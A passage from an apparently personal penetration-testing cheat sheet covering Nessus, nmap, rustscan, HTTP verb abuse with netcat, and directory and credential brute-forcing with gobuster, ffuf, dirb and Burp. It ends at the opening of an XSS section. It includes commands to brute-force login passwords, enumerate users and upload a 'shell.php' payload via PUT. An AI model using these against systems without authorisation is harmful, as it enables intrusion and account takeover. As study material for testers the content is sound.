> - Last step, sends probes to verify the vulnerability exists. (open to false positives as some probes are mild)

It can also be configured if you want ignore OS vulnerabilities and only target known webserver vulnerabilities.

**Under Policies, Nessus tool has numerous policies you an implement in the scan depending on what you are scanning:**

> - Web application tests against a web application server\

![](https://i.imgur.com/btDyWdN.png)
    
> - Network scan when testing again the network\

![](https://i.imgur.com/Amnc2EN.png)

**CREATE OWN POLICY**

> - Or create your own policy depending on the requirements using *advanced scan*
> - Under Host Discovery
> - Untick the local nessus host option, incase we are scanning a network and don't want to scan ourselves\
> - Under Port Scanning
> - Enable TCP under Port Scanners for a more accurate scan
> - Under plugins (top bar)
> - Add plugins by family or individual checks.
> - Once successfully created, your custom scan will be available to be selected
> - Under settings, ensure you input the $RHOST

![](https://i.imgur.com/YbwyfT1.png)

Once setup, the scan will being and you will see once complete the following for indepth details:

**Example of info gathered and exporting from Nessus:**

![](https://i.imgur.com/TdZTNji.png)

![](https://i.imgur.com/YWYWBsL.png)

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------

# SCANNING-&-FINGERPRINTING


Unmasking the infrastructure and understanding the technology being used or where everything lies. Routers, servers or clients and such.

------------------------------------------------------------------------------------------------------------------------------------------------------

## Common-Ports

Tags: [FPING-Ping-Sweep](#FPING-Ping-Sweep), [NMAP](#NMAP), [Rustscan](#Rustscan)

|                     | Descriptions                   | Notes                                                                              |
|:------------------- |:------------------------------ |:---------------------------------------------------------------------------------- |
| `21`                | FTP                            |                                                                                    |
| `22`                | SSH                            |                                                                                    |
| `23`                | TELNET                         |                                                                                    |
| `25`                | SMTP                           | Simple mail transfer protocol                                                      |
| `53`                | DNS                            | Usually UDP but if its TCP it is because it needs to do zone transfers             |
| `80` / `443`        | HTTP / HTTPS                   |                                                                                    |
| `88`                | Kerberos                       | Key Distribution Center: Almost always a domain controller if they have port 88    |
| `110`               | POP3                           |                                                                                    |
| `115`               | SFTP                           | SSH File Transfer Protocol                                                         |
| `135`               | MSRPC                          | SMB Related - MS Remote Procedure Call                                             |
| `137`, `138`, `139` | NETBIOS                        | SMB Related - network file sharing protocol                                        |
| `143`               | IMAP                           |                                                                                    |
| `389` / `636`       | LDAP / LDAPS                   | lightweight directory access protocol, indicates (likely):  domain name controller |
| `445`               | MICROSOFT - DS                 | SMB Related - network file sharing protocol, SAMBA service is linux equivalent     |
| `1433` / `1434`     | MS SQL Service                 | MSSQL database                                                                     |
| `3306`              | MySQL                          |                                                                                    |
| `3389`              | RDP                            | Remote Desktop Protocol, Tools:`rdesktop <ip>:<port>`                              |
| `8080` / `8443`     | HTTP proxy, HTTP(s) web server |                                                                                    |

[Back to Top](#table-of-contents)


------------------------------------------------------------------------------------------------------------------------------------------------------


## FPING-Ping-Sweep

Flags: [Common-Ports](#Common-Ports), [NMAP](#NMAP), [Rustscan](#Rustscan)

Ping sweeping is useful to unmask the infrastructure of a business and understand what the layout appears to be for devices and interconnectivity.\
Ping sweeping tool are **automatic** and perform the same operation to *every host* within a subnet or IP range.

|                                                     | Descriptions                                                                            |
|:--------------------------------------------------- |:--------------------------------------------------------------------------------------- |
| @ **Syntax**                                        | ---                                                                                     |
| `Fping -a -g <ip_range_10.10.10.0/24> 2> /dev/null` | Example                                                                                 |
|                                                     |                                                                                         |
| @ **Options**                                       | ---                                                                                     |
| `fping`                                             | improved version of the `ping` utility.                                                 |
| `-a`                                                | forces to show alive hosts                                                              |
| `-g`                                                | instructs for *ping sweep* instead of normal ping                                       |
| `ip_range`                                          | can use standard CIDR notation (10.10.10.0/24) or range (**10.10.10.0** *10.10.10.255*) |
| `2> /dev/null`                                      | useful to direct errors you don't want when running fping in a LAN                      |
| =========================================           | =========================================                                               |

**NOTES**:

> - Sends Special ICMP (type 8 - **echo request**) to a host
  > - If replies with **echo reply** packets: host is live
> - ICMP is part of the internet protocol used to carry diagnostic messages
> - If using fping from LAN, you will catch errors about hosts being offline; direct errors to /dev/null

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## NMAP

Tags: [Common-Ports](#Common-Ports), [FPING-Ping-Sweep](#FPING-Ping-Sweep), [Rustscan](#Rustscan)

Network mapper is an open source tool for exploration and security auditing. Process to determine what UDP and TCP ports are open on target hosts. It also lets you know which *daemon* is listening (regarding software and version).

The goal of port scanning/service detection is the find the software name and version of the daemons running on each host

**NOTES:**

> - Switch between `-sS` and `-sT` scans depending on server. sometimes theres connection limits and `-sS` scan takes forever since connections won't be closed
> - When running a **UDP** scan don't run `-p-` as it will take forever unless you use extra options to limit probe retries and speed up the process

```powershell
#SEARCH SCRIPTS
    locate *.nse | grep ftp         : Example to filter for FTP protocol scripts
    locate *.nse | grep $SEARCHterm

#COMMON SCRIPTS SCAN
    nmap -p $RHOST -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse $IP
    nmap -sV --script vuln $RHOST -p $RPORT
    nmap -sV --script vulscan $RHOST -p $RPORT
    nmap -sV --script "http-*" $RHOST -p $RPORT
    nmap -sV --script "smb-vuln-*" $RHOST -p $RPORT
    nmap -sV --script=smb-enum-shares $RHOST
    nmap -sV --script=smb-enum-users $RHOST
    nmap -sV --script=smb-brute $RHOST

#OPTIONS
    $RHOST      : Remote host, Victim
    $RPORT      : Remote port, Victim
    -sV         : Version enumeration on all ports/daemons
    -sC         : Default scripts ran through nmap to check for common vulnerabilities
    -A          : Aggressive scan, running -O -sC -sV --traceroute options,
    -O          : Operating System enumeration
    -p-         : All ports, specify ports -p 200-5000 or -p 23,34,56
    -Pn         : Treat all ports as alive hosts, do not sent ICMP packets to ping port first
    -n          : Remove DNS resolution, speeds things up
    -T4         : T1-5 in terms of speed. 5 is the fastest but could end up with false positives
    -oN $FILE   : Save to textfile
    -sn         : ICMP Packets only, ping host
    -sN         : "NULL" packets, stealth but no 3 way handshake and limited info gathered
    -sT         : "TCP CONNECT" packet, replaces -sS scan; more accuracy but louder footprint
    -sS         : "SYN SCAN" packet, default scan unless specified; stealthy scan but slightly less info compared to "TCP CONNECT"
    -sU         : "UDP SCAN" packet

#TCP SCANS
    nmap -T4 -sV -sC -oN $FILE $RHOST       : Version, script scan
    nmap -T4 -A -p- $RHOST                  : Aggressive scan, all options
    nmap -T4 -Pn -p- -n -sV $RHOST -v       : Quick Scan
    nmap -sn $RHOST/24                      : Ping sweep i.e 192.168.99.0/24 to ping all on network and discover hosts, can be used with $FILE instead that contains numerous networks
    nmap -T4 -O -sT $RHOST                  : OS detection, using TCP CONNECT scan for accuracy
    nmap --traceroute $RHOST                : Discover Amt of ROUTERS between attacker and victim
#UDP
    nmap -sU --top-ports -sC --script-timeout 5m $RHOST                       : UDP scan, only top 10000 ports and limiting script timeout
    nmap -sU -T4 -Pn -n -p- -vv --open --max-retires 1 --min-rate 1000 $RHOST : Full 65535 port scan, only open ports and limit probing retries and speed the scan up
    nmap -sU -T4 -Pn -A --top-ports 100 

#FIREWALL
    nmap -sF $RHOST  : Sends "FIN" flag, used against 'stateless firewall' that checks for "SYN" flags
    nmap -sX $RHOST  : Xmas scan, sends "FIN PSH URG" simultaneously, useful for systems with 'stateless firewall'
    nmap -sA $RHOST  : Uncommon scan, only useful is small set situations to discover 'firewall' rule sets and config; does not work in normal setups.
    
#STEALTH SCANS
    nmap -sN $RHOST : Send "NULL" packets, less likely for IDS to pick up but limited info gathered

#IP FILTER TECHNIQUES
    192.168.99.0-139,141-255                            : To filter out your machine (i.e if your machine is ...140)
    192.168.1.4    200.200.14.46    10.10.10.40         : Scanning list of ips
    192.168.1.0/24 200.200.14.0/16  10.10.10.0/8        : Scanning network CIDR notation
    192.168.1.*                                         : Scanning using wildcard 0-255 range
    10.10.*.1                                           : Scanning when you know the last octet of router address but working on a /16 network
    200.200.*.*                                         : Scanning 200.200.0.0/16
    200.200.6-12.*                                      : Scanning a specific interval for every octet between 6-12
    10.14.33.1,3,17                                     : Using comma to specify octets to scan
    

```

**NOTES**:

> - Daemons are software running on a server to provide a service; listening on a specific **port**
> - Portscanning gives information but **also let you detect if there is a firewall between you and the target**
> - E.g TCP 3-way handshake, server returns with reset `RST + ACK` flags telling client the port is closed, indicating potential firewall
> - every **TCP connect** scan gets recorded in daemon logs, so sysadmins can easily detect it.

> - **SYN (stealth) scans** were intended to avoid the connect.
  > - Sends SYN flag to target, if receives an ACK response then scanner sents RST packet to stop handshake immediately
  > - So SYN scans cannot be detected by daemons logs as no real connection gets logged but a well-configured IDS can still detect the scan
  
> - **Version detect scan** is easily picked up on but it reads from the server **the banner of the daemon listening** on a port
> - **Four basic TCP ports** that can be used as indicators of *live hosts*
  > - 22 - SSH, 
  > - 445 - SMB/SAMBA, 
  > - 80 - HTTP, 
  > - 443 - HTTPS** 

**DETECTING FIREWALL:**

  > - Pay attention to *incomplete* nmap scans: if TCP scan succeeded against well known service such as webserver, then nmap **should not** fail or struggle with -sV version can.
  > - `tcpwrapped` means the handshake was completed but remote host closed connection without receiving any data
  > - `--reason` used in nmap will show explanation why a port is marked open or closed: might learn that RST packet sent during handshake, so something prevent the handshake completing

[Back to Top](#table-of-contents)

---

## Rustscan

Tags: [Common-Ports](#Common-Ports), [FPING-Ping-Sweep](#FPING-Ping-Sweep), [NMAP](#NMAP)

Faster than nmap and has the lead into using nmap after. Normally easiest to just use rustscan to scan for open ports immediately and then use nmap for the longer scans.

```powershell
#OPTIONS
    -b : Batch file limit, to be more stealthy
    -a : Ip address
    -- -$switch : Using -- to indicate end of rustscan and what to pipe to nmap, i.e -sS -A etc..
    -A : Runs -A option for NMAP which is very aggressive and adds the following: -Pn -vvv -p $PORTS
    -sS: Stealth scan
    -sV: Version scan
    -sC: Script scan
    -g : Greppable, no NMAP scan, can be used with multiple IPs to get all ports open

#USAGE - Do both slow -b 400 scan and fast scan to ensure all ports are caught
sudo rustscan -b 400 -a 10.10.92.232 -- -sS -A -oN 10.10.92.232.txt
sudo rustscan --ulimit 3000 -t 2000 -a 10.10.13.39 -- -sS
sudo rustscan --ulimit 3000 -t 2000 -a 10.10.13.39 -- -sV -sC --script=vuln
sudo rustscan --ulimit 3000 -t 2000 -a 10.10.13.39 -- -sV
sudo rustscan -g --ulimit 3000 -t 2000 -a $RHOST,$RHOST2 
```

[Back to Top](#table-of-contents)

---

# WEB-ATTACKS

---

Web applications are proportionately a large attack surface to businesses.\
Web applications run on web servers so this means it is important for testing the securing of the web server from external and internal threats.

[Back to Top](#table-of-contents)

---

## HTTP-Verbs

Looking at how we can exploit HTTP verbs

| List of HTTP Verbs | Description                                                            |
| :----------------- | :--------------------------------------------------------------------- |
| `GET`              | *get* a resource i.e open webpage and *get request* webpage            |
| `POST`             | *post* submit html form data, parameters in the **message body**       |
| `PUT`              | *put* file on server, upload **dangerous feature if misconfigured**    |
| `DELETE`           | *delete* to remove file from server, **dangerous if misconfigured**    |
| `HEAD`             | *head* is similar to *get* but only for Headers excluding message body |
| `OPTIONS`          | query web server for what **verbs are enabled**                        |

**REST APIs** are Representational State Transfer Application Programming Interface
  - > Relies strongly on almost all HTTP verbs due to being an API
  - > So we can expect these applications to have subverted functionality
  - > Common to use `PUT` for **saving data** and not for *saving files*
  - > **Before** reporting about a `PUT` or `DELETE` method found, consider its exact impact twice.
    - > Common to confuse REST APIs `PUT` method which creates **new content** instead of *creating a file*
    - > After issuing a `PUT`, you should try to look for the existence of the file created

[Back to Top](#table-of-contents)

---

### Misconfigured-HTTP

Misconfigured HTTP verbs are often rare in web servers these days due to advances in web technologies and better configurations. However these exploits are still more common in **embedded devices, IP cameras, Digital Video Records** and other such **smart devices**

The following exploits show the use of `netcat` however it is not restricted to only that as the premise is more commonly used in programs like `ZAP` and `Burpsuite`

**EXAMPLE SYNTAX:**

> - `POST /login.php HTTP/1.1\`
> - `Host: <host.com>`
> - /empty line
> - /empty line
> - `usr=JOHN&passwd=p4ss`

|                                           | Description                                                                                              |
|:----------------------------------------- |:-------------------------------------------------------------------------------------------------------- |
| @ **Verbs**                               | ---                                                                                                      |
| `GET / HTTP/1.1`                          | *get* a resource i.e open webpage and *get request* webpage                                              |
| `HEAD / HTTP/1.0 `                        | *head* is similar to *get* but only for Headers excluding message body, Grabbing Banner and service info |
| `OPTIONS / HTTP/1.0 `                     | query web server for what **verbs are enabled**                                                          |
| `DELETE /login.php HTTP/1.0`              | Example delete login page, *delete* to remove file from server, **dangerous if misconfigured**           |
| `PUT /payload.php HTTP/1.0`               | *put* file on server, upload **dangerous feature if misconfigured**                                      |
| `POST /login.php HTTP/1.1`                |                                                                                                          |
|                                           |                                                                                                          |
| @ **Concepts**                            | ---                                                                                                      |
| `/` or `/path/to/resource`                | the `/` is the path                                                                                      |
| `Accept: text/html`                       | What document type is expected in the **response back**                                                  |
| ========================================= | =========================================                                                                |

The following exploits show the use of `netcat` however it is not restricted to only that as the premise is more commonly used in programs like `ZAP` and `Burpsuite`

**CONNECT**

> `nc $RHOST $RPORT`

**HTTP HEAD - BANNER:**

> `HEAD / HTTP/1.0` 
> 2x Empty Lines

**HTTP GET:**

  > can also pass arguments,`<*GET /page.php?course=PTS HTTP/1.1*>` `course=PTS` passed to `page.php`

**HTTP OPTIONS:**

> `OPTIONS / HTTP/1.0`

![](https://i.imgur.com/lwdiODG.png)

**HTTP DELETE:**

> `DELETE /login.php HTTP/1.0`

**HTTP PUT:**

Require to know the file size that you want to upload on the server. This makes is a little more complex as you need to use additional tools to get the size of your file.\
Using this information, you can then build the `PUT message`

> `wc -m $FILEpayload` count bites to ensure complies with size
> `PUT /payload.php HTTP/1.0`

> - **Upload** a file to server
> - Complex due to having to know the **size** of the file you want to update
> - use **UNIX** utility `wc` (word count) with `-m` switch to count how long in bytes the file is
> - `wc -m shell.php`
> - Output: **136**
> - add:
> - `Content-type: text/html` to your put header
> - `Content-length: x` to your PUT header.

![](https://i.imgur.com/ankCMID.png)

------------------------------------------------------------------------------------------------------------------------------------------------------

## Web-server-Directories-Files

Webmasters can typically begin and create new versions of a site or additional pages on a website in a `/new` subdirectory **without linking**.\
This means that users and search engines cannot find the resources until the webmaster publishes a link to that.

**However** this does not it is inaccessible if you know the URL. e.g Typing in the address manually `http://site.com/new` will access that new content.

**Risky, as the it can contain unintended information:**
  - > New or untested features
  - > Backup files
    - > such as IP addresses of backend database server or credentials used to test a feature
  - > Testing information
  - > Developer's notes

**Two ways to enumerate resources**
  - > **Brute-force** # inefficient and luck involved due to having to uncover a resource by testing every iteration possible
  - > **Dictionary attacks** # Target the "commons" that people typically fall back on for names or extensions.
    - > e.g comon backup file names `.bak``.old``.txt``.xxx`

The following is an example of using a tool to enumerate instead of trying to use a manual method that is time consuming.

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

### FEROXBUSTER

Tags: [GOBUSTER](#GOBUSTER), [DIRSEARCH](#DIRSEARCH), [FFUF](#FFUF), [DIRBUSTER](#DIRBUSTER), [DIRB](#DIRB), [Burp-Suite](#Burp-Suite)

```powershell
#OPTIONS
    -n       : No recursion
    -w $FILE : Wordlist
    -u $RHOST: Victim
    -x $EXT. :Target extensions ie asp,aspx,html,php,war,txt,bak,old
    -e       :Follow URLs from get requests and queue up any valid URLs
    -L 4     :Limit concurrent scans to 2
    
#USAGE
    feroxbuster -L 4 -x php,txt -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.243.48
    feroxbuster -n -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.243.48 
```

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

### DIRSEARCH

Tags: [FEROXBUSTER](#FEROXBUSTER), [GOBUSTER](#GOBUSTER), [FFUF](#FFUF), [DIRBUSTER](#DIRBUSTER), [DIRB](#DIRB), [Burp-Suite](#Burp-Suite)

|                                                                                          | Desciption                                                                                      |
|:---------------------------------------------------------------------------------------- |:----------------------------------------------------------------------------------------------- |
| @ **Syntax**                                                                             | ---                                                                                             |
| `dirsearch -r -t 40 -f --full-url -w $FILEwordlist -u $RHOST`                            | default use with `-u` url and `-w` wordlist, `-r` recursive, `-f` force extensions `-t` threads |
| `dirsearch -r -t 40 --full-url -w /usr/share/wordlists/dirb/common.txt -u 10.10.115.196` | `--full-url` in order to easily click the urls and check them                                   |
|                                                                                          |                                                                                                 |
| @ **Options**                                                                            | ---                                                                                             |
| `-u`                                                                                     | url target                                                                                      |
| `-w`                                                                                     | wordlist                                                                                        |
| `-r`                                                                                     | recursive bruteforcing                                                                          |
| `-f`                                                                                     | force extensions such as .html .php on each word                                                |
| `-t`                                                                                     | default is 30 threads, can speed up but higher you go the more risk of Denial of service        |
| =========================================                                                | =========================================                                                       |

[Back to Top](#table-of-contents)

---

### GOBUSTER

Tags: [FEROXBUSTER](#FEROXBUSTER), [DIRSEARCH](#DIRSEARCH), [FFUF](#FFUF), [DIRBUSTER](#DIRBUSTER), [DIRB](#DIRB), [Burp-Suite](#Burp-Suite)

Able to do directory bruteforcing, dns enumeration and fuzzing

|                                                                                                                  | Desciption                                                                       |
|:---------------------------------------------------------------------------------------------------------------- |:-------------------------------------------------------------------------------- |
| @ **Directory Enumeration**                                                                                      | ---                                                                              |
| `gobuster dir -u $RHOST -w $FILEwordlist`                                                                        | `-w` to utilise wordlist from dirbuster folder                                   |
| `gobuster dir -u $RHOST -w $FILEwordlist -t $THREADS -x $EXT -b $CODES -e`                                       | Using another common wordlist **raft-small-words**, `-t` for threads to speed up |
| `gobuster dir -u <ip.addr> -x php,old,bak,txt -w </usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt>` | `-x` to filter file extensions                                                   |
|                                                                                                                  |                                                                                  |
| @ **Directory Options**                                                                                          | ---                                                                              |
| `dir`                                                                                                            | select for dir enumeration functionality                                         |
| `-b 403,404`                                                                                                     | blacklist negative codes                                                         |
| `-e`                                                                                                             | display the website links                                                        |
| `-P $PASS` and `-U $USER`                                                                                        | For basic authentication                                                         |
| `-u $RHOST`                                                                                                      | specify target                                                                   |
| `-w $FILEwordlist`                                                                                               | specify `path/to/wordlist`                                                       |
| `-x $EXT` {php,html,bak,old,txt}                                                                                 | specify extensions to filter in                                                  |
| `-t $THREADS` {50}                                                                                               | to specify threads for speed                                                     |
| `-n`                                                                                                             | specify to disable status codes                                                  |
| `-l`                                                                                                             | showing length of files found                                                    |
| `-o $FILEsave`                                                                                                   | output into a text file to save details                                          |
|                                                                                                                  |                                                                                  |
| =========================================                                                                        | =========================================                                        |
| @ **DNS Enumeration**                                                                                            | ---                                                                              |
| `gobuster dns -d $WEBSITE -w /usr/share/seclists/Discovery/subdomains-top1million-5000.txt`                      | `<website.com>` or ip.address, using seclists for subdomains                     |
|                                                                                                                  |                                                                                  |
| @ **DNS Options**                                                                                                | ---                                                                              |
| `-d $WEBSITE`                                                                                                    | `-d` the target domain                                                           |
| =========================================                                                                        | =========================================                                        |

[Back to Top](#table-of-contents)

---

### FFUF

Tags: [FEROXBUSTER](#FEROXBUSTER), [GOBUSTER](#GOBUSTER), [DIRSEARCH](#DIRSEARCH), [DIRB](#DIRB), [DIRB](#DIRB), [Burp-Suite](#Burp-Suite)

Fuzzing directories, files, HTTP VERB parameters and passwords

**NOTES:**

> - **Discovery of webserver language** we would assume usually that `index.<extension>` is the default page on most websites so we can try common extensions for the index page
> - `content-type` and `user/pass` references can be found through Burp Suite 

**FIND REGISTERED USERNAMES**:

> - `ffuf -c -w $FILEusers -X POST -d "username=FUZZ&email=TEST&password=TEST&cpassword=TEST" -H "Content-Type: application/x-www-form-urlencoded" -u http://$RHOST -mr "username already exists"`

**MULTI-FUZZ**:

> - `ffuf -c -w $FILEusers:$W1,$FILEwordlist:$W2 -X POST -d "username=$W1&password=$W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://$RHOST/customers/login -fc 200 `
> - selecting $FILEusers attached to variable: **W1**, selecting $FILEwordlist attached to variable: **W2** 
> - Filtering for 200 successful codes only

**GET PARAMETER:**

- /usr/share/seclists/Discovery/Web-content/burp-parameter-names.txt

> `ffuf -c -w $FILEwordlist -u https://$RHOST/script.php?FUZZ=test_value` Enumerate PARAMETER at $FUZZ$
> `ffuf -c -w $FILEwordlist -u https://$RHOST/script.php?id=FUZZ` Enumerate VALUE at $FUZZ$

**POST PARAMETER:**

- /usr/share/wordlists/rockyou.txt

> `ffuf -c -w $FILEwordlist -X POST -d “username=$USER\&password=FUZZ“ -u https://$RHOST/login.php` Enumerate PASSWORD at $FUZZ$
> `ffuf -c -w $FILEwordlist -X POST -d "uname=FUZZ&passwd=FUZZ&submit=submit" -u http://$RHOST -fs 1435 -H 'Content-type: $HEADcontent'` Enumerate USER PASSWORD at $FUZZ$, filter FILESIZE, HEADERcontent

**WEB STACK:**

- /usr/share/seclists/Discovery/Web-Content/web-extensions.txt

> `ffuf -c -w $FILEwordlist -u http://$RHOST/indexFUZZ` Enumerate  .EXTENSION at $FUZZ$

**DNS BRUTEFORCING:**

- /usr/share/seclists/Discovery/DNS/namelist.txt

> `ffuf -fs $FILEsize -c -w $FILEwordlist -H "Host: FUZZ.$WEBSITE.$DOMAIN" -u http://$RHOST/` Enumerate DNS at $FUZZ$

|                                                                                                                                                           | Desciption                                                                                                                                                   |
|:--------------------------------------------------------------------------------------------------------------------------------------------------------- |:------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| @ **Directory or File Fuzzing**                                                                                                                           | ---                                                                                                                                                          |
| `ffuf -c -w $FILEwordlist -u http://$RHOST/FUZZ `                                                                                                         | Directory or file bruteforcing, `FUZZ` keyword used in place of where you want to fuzz.                                                                      |
| `ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://$RHOST/FUZZ`                                                         | example                                                                                                                                                      |
|                                                                                                                                                           |                                                                                                                                                              |
| @ **Options**                                                                                                                                             | ---                                                                                                                                                          |
| `-c`                                                                                                                                                      | Colourise the output                                                                                                                                         |
| `-t <#>`                                                                                                                                                  | to specify threads for speed                                                                                                                                 |
| `-w <path/to/wordlist>`                                                                                                                                   | specify `path/to/wordlist`                                                                                                                                   |
| `-X <verb>`                                                                                                                                               | selecting the HTTP method                                                                                                                                    |
| `-e .php,.txt`                                                                                                                                            | Excluding with `-e` from wordlists to filter for your searching                                                                                              |
| `fc <code>`                                                                                                                                               | filtering out for any codes we don't want to display i.e 403                                                                                                 |
| `-H`                                                                                                                                                      | Header switch Name:Value used with subdomain bruteforcing or to tell site we are **sending form data** or what header we are sending                         |
| `-fs {size}`                                                                                                                                              | When doing dns enumeration, since all results will return code:200 then we want to filter the most recurring size value and only have the nonrecurring sizes |
| =========================================                                                                                                                 | =========================================                                                                                                                    |


[Back to Top](#table-of-contents)

---

### DIRBUSTER

Tags: [FEROXBUSTER](#FEROXBUSTER), [GOBUSTER](#GOBUSTER), [DIRSEARCH](#DIRSEARCH), [FFUF](#FFUF), [DIRB](#DIRB), [Burp-Suite](#Burp-Suite)

Common tool to perform web enumeration with UI. Requires to be downloaded.
Performs enumeration using either dictionary brute force or pure brute force techniques

**Notes**:
- > DIRBUSTER is a visual GUI based tool\
- 

![](https://i.imgur.com/EDznqXq.png)

**Linux also has a commandline alternative `Dirb` to enumerate web resources within an application**
  - > Once ran:
    - > `Results` will show a list of directories and files found
    - > Clicking to view *RESPONSE* will show the output of the header received
    - > Response `200` indicates the information is accessible
    - > Reviewing the items are important as it could include vulnerable information\

![](https://i.imgur.com/0vvgpZZ.png)


[Back to Top](#table-of-contents)

---

### DIRB

Tags: [FEROXBUSTER](#FEROXBUSTER), [GOBUSTER](#GOBUSTER), [DIRSEARCH](#DIRSEARCH), [FFUF](#FFUF), [DIRBUSTER](#DIRBUSTER), [Burp-Suite](#Burp-Suite)

Command line tool to discover brute-force resources on web servers.

|                                                                           | Description                                                                                                                        |
| :------------------------------------------------------------------------ | :--------------------------------------------------------------------------------------------------------------------------------- |
| @ **Bruteforce Syntax**                                                   | ---                                                                                                                                |
| `dirb <target_website>`                                                   | Runs dirb against the target                                                                                                       |
| @ **Wordlist Syntax**                                                     | ---                                                                                                                                |
| `dirb <target_website> <path/to/wordlist.txt>`                            | Runs dirb using wordlist                                                                                                           |
| `dirb <http:website.com> /usr/share/dirb/wordlists/<chosen.wordlist.txt>` |
| `dirb 192.168.99.22 -X ,.txt <path/to/wordlist>`                          | Append extension to the words in wordlist, places `,` in front of `.txt` so it checks for just the words in list at same time      |
| @ **Options**                                                             | ---                                                                                                                                |
| `dirb`                                                                    | runs dirb and displays help messages including commands                                                                            |
| `wordlists` or `seclists`                                                 | to display wordlists, dirb                                                                                                         |
| `-a <agent_string>`                                                       | Run custom agent string incase the application verifies the user agent, use `www.useragentstring.com` for selection of user agents |
| `-p`                                                                      | Specify a proxy                                                                                                                    |
| `-u "admin:password"`                                                     | utilise authentication                                                                                                             |
| `-r`                                                                      | Non recursive, stop once the directory is found and not proceed to any children directory                                          |
| `-z 1000`                                                                 | Speedy delay in milliseconds                                                                                                       |
| `-o <filename.txt`                                                        | Save results to an output file                                                                                                     |
| `-X ,.txt`                                                                | Append extension to the words in wordlist, places `,` in front of `.txt` so it checks for just the words in list at same time      |

**Notes**:
- > Wordlists found in directory `cd /usr/share/dirb/wordlists`
- > Select a wordlist comparable to the amount of time you want to spend on bruteforcing
- > Searching on github for wordlists relevant to your search would be ideal `github wordlist discovery`
  - > Could add words that are relevant to the native language of the web server location/potential webmaster

[Back to Top](#table-of-contents)

---

### ZAP

Relational Tools:\
[[#Burp-Suite]]

Powerful automated tool for web application vulnerabilities and various scanning of entry points.\
Tool includes enumeration and directories but so much more.

**Functions include:**
- > Spider and find all the directories, items and various parts of the target website.
- > Run scans and scripts to enumerate and find vulnerabilities

**Tools**
- > List of various tools you can run, notably the 
  - > active scan: pre-set payloads are injected into the website, input forms, URL and so on
  - > spidering: discovery of all website resources to gather info

**Example list of tools:**

![](https://i.imgur.com/2fVbNWg.png)

**Spidering**
- After spidering, you can interact with the gather information under the *Messages* tab
  - > allowing you to attack, scan, amend parameters of the e.g GET *request* as well as filter and exclude sections for future enumerations

**Example of spidering and transfer of info to other tools:**

![](https://i.imgur.com/9jM2L74.png)

[Back to Top](#table-of-contents)

---

### Burp-Suite

Relational Tools:\
[[#ZAP]], [[#FEROXBUSTER]], [[#GOBUSTER]], [[#DIRSEARCH]], [[#FFUF]], [[#DIRBUSTER]], [[#DIRB]]

Proxies like **Burp Suite** operate on the *application layer* which allows the proxies to understand HTTP and traffic must be directed to them by configuring the client application.\
**Burp Suite** is an **application** penetration testing tool and acts as a web *proxy* between browser and target application.

**Burp Suite** is doing a Man-in-the-middle attack on the encryption as you route traffic through it.\
Whereas **Wireshark** is just capturing raw traffic and does not have enough info to allow it to decrypt traffic as it is considered a **Network Packet Sniffer** and operates on the lower OSI layers.

Intercepting Proxies such as **Burp Suite** lets you analyze and modify any *request* and any *response* exchanged between an HTTP client and server.
- > Through intercepting, pentesters can study a web application behaviour and manually test for vulnerabilities.

**Example of a website that contains robots.txt with sensitive info**

**robots.txt** is a file which is common for webapps to contain as it usually hosts the information important for internet *crawlers* and various tools that scan the whole internet for search engines and such\
It is also common for these files to contain unintentional sensitive information as the developer might think that this will protect sensitive locations but for a hacker; they can now **identify these locations** 
- > Will contain references such as 'Disallow:/cgi-bin/' meaning that www.host.com/cgi-bin/ is hidden from search engines.
- > It also means that such a path *may* existing within the application as an attacker could come to that conclusion.

**Step 1 - Always check HTML code for web applications**
- > F12 to inspect

![](https://i.imgur.com/3HcxcDN.png)

**Step 2 - Inspect any interesting paths or info**
- > Directly access the site and see if you can access anything
- > Going to host.address.com/**robots.txt** yields info

![](https://i.imgur.com/dTeUyHt.png)

**Step 2.1 - Optional, load the payload from robots.txt and use Intruder**
- > You can skip this step if you use **ZAP** or other spidering software as they will auto check the common paths. 
- > If the robots.txt or info you gathered have ***uncommon*** paths then loading your own payload is easy.
- > save the robots.txt info to a textfile somewhere on your computer
- > **Intruder** is powerful in automating alot of the checkpoints and details that you may wish to inspect for a response. A text file such as robots.txt may contain numerous pathways but doing each individually would be tedious.
- > **Configure burpsuite settings**, target, payload, remove url encoding

![](https://i.imgur.com/i6zjytO.png)
     
- > **Attack!**

![](https://i.imgur.com/VGwDCPv.png)

**Step 3 - Crawl webpages to gather info**
- > If you have *burpsuite* professional then you can **spider**
- > Otherwise **ZAP** is a great took to spider\

![](https://i.imgur.com/ykwVDMr.png)

**Step 4 - Continue to investigate new info**
- > Continue to search for interesting info
- > You can either visit the site directly `ip.address/connections/`
- > Or you can use Repeater in **Burpsuite**
- > **Repeater** can be used to send, edit and resend different forms of header requests while also being able to see the responses. This is also powerful in testing different areas or pathways within the webapp while searching for vulnerabilities or priviledged information\

![](https://i.imgur.com/w5sjBFx.png)

![](https://i.imgur.com/5pN1aT5.png)

**If you recall the robots.txt, it contained an entry for `/*?debug=*`.**\
`/*?debug=*`
  - > such a path means that the web crawler should not index ANY path (* is a wildcard - which means anything) that contains the word ?debug= and ends with ANYTHING (another wildcard *)
  - > Removing the wildcards and being left with `/?debug=` might display unintended behaviour so we need to give it a value, **TRUE** or **FALSE**
  - > Using **Repeater** we can test for different cases and see if there is any potentially unintended information that we can gather.


**Finally, following the trail:**
- > We head on over to the new address `http://172.16.160.102/connections/?debug=TRUE`

![](https://i.imgur.com/9VOj5NA.png)

[Back to Top](#table-of-contents)

---

## XSS

Cross-Site-Scripting

XSS involves injecting malicious code into the output of a web page. This code is then executed by the users of the site.

XSS is a vulnerability that lets an attacker control some of the content of a web application targeting web application **users**.\
Using this, some things the attacker can do, and more:

**XSS vulnerabilities can be:**

